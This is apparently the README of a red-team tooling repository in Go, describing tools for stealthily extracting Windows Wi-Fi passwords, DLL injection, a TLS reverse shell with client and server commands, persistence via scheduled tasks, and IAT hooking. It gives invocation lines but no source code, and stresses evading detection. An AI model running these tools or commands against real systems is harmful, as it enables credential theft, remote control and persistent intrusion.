# Mal(icous)Go

## Disclaimer

Should only be used for systems that you have explicit permission to target, I take no responsibility for actions performed using any code from this repository.

Use at your own risk! 

## wifi pwds

Retrieve WLAN passwords from Windows. Uses native calls in Win32 API rather than executing `netsh wlan ...` as a command, this approach is more stealthy!

## inject

Injects a DLL into a remote process uses the classic on disk / `LoadLibrary` approach so should be used primarily for testing as it is not opsec safe.

Usage:

~~~
inject_x64.exe <dll_path> <pid>
~~~

## rshell

Simple reverse shell implementation client supports comms over TLS using the `tlsserver.go` server code.

### client

_Certificate is embedded into the compiled binary, update to a newly created cert._

~~~
client -tls -port 4444 <host>
~~~

### server

~~~
tlsserver -port 4444 <cert> <key>
~~~

## proxy

Simple TCP proxy

~~~
proxy <port> <host:port>
~~~

## persistence

A PoC to test adding a scheduled task into windows via COM/OLE rather than the noisey approach of using `schtasks.exe`. Please adjust to your needs!

## iat

Demonstrates Go being used to perform IAT hooking at runtime via an injected DLL. This example actually does not perform anything malicious but the technique could definitely be used for this purpose!